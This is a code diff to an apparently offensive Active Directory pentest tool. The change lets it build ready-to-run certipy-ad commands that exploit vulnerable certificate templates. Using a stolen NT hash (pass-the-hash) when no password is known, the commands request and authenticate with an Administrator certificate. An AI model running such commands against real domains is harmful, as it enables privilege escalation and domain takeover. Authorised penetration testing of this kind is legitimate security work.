@@ -1335,10 +1335,31 @@ def run(report, store, ui=None):
     # multi-step and ESC8/ESC11 are LAB-ONLY).
     _ESC_REQ_ONE_SHOT = {"ESC1", "ESC2", "ESC6", "ESC9", "ESC10",
                          "ESC13", "ESC15", "ESC16"}
-    if e.cert_templates and e.creds:
-        # first-known cred as authenticating principal
-        ((_ulc_ac, _pw_ac), _occs_ac) = next(iter(e.creds.items()))
-        _disp_ac = _occs_ac[0][0] if _occs_ac[0][0] != "<user>" else _ulc_ac
+    if e.cert_templates and (e.creds or e.nt):
+        # iter-104: prefer plaintext when available; fall back to any known
+        # NT hash for the authenticating principal (certipy-ad req accepts
+        # -hashes ':NT'). Same pattern as R-CONSTRAINED / R-ADMIN-CRED.
+        if e.creds:
+            ((_ulc_ac, _pw_ac), _occs_ac) = next(iter(e.creds.items()))
+            _disp_ac = _occs_ac[0][0] if _occs_ac[0][0] != "<user>" else _ulc_ac
+            _adcs_auth = f"-p '{_pw_ac}'"
+        else:
+            # pick the first hash whose user is known
+            _pick = None
+            for _h, _occs in e.nt.items():
+                for _hu, _hs, _hl in _occs:
+                    if _hu:
+                        _pick = (_hu, _h)
+                        break
+                if _pick:
+                    break
+            if _pick is None:
+                _pick = ("<user>", "<nthash>")
+            _disp_ac = _pick[0]
+            _ulc_ac = _pick[0].lower()
+            _pw_ac = _pick[1]
+            _adcs_auth = (f"-hashes 'aad3b435b51404eeaad3b435b51404ee:{_pick[1]}'"
+                          if _pick[1] != "<nthash>" else "-p '<password>'")
         _dom_esc = store.dominant_domain() or "<dom>"
         _dc_esc = store.dc_ip() or "<DC-IP>"
         _emitted_tpls = set()
@@ -1360,7 +1381,7 @@ def run(report, store, ui=None):
                 f"{_esc_tag} template '{tpl['template']}' -> req cert as Administrator",
                 crit=9, conf=0.9, ready=1.4, prox=0.95,      # score 10.77
                 commands=[
-                    f"certipy-ad req -u '{_disp_ac}@{_dom_esc}' -p '{_pw_ac}' "
+                    f"certipy-ad req -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
                     f"-ca '{_ca_tag}' -template '{tpl['template']}' "
                     f"-upn 'administrator@{_dom_esc}' -dc-ip {_dc_esc}",
                     f"certipy-ad auth -pfx administrator.pfx -dc-ip {_dc_esc}",
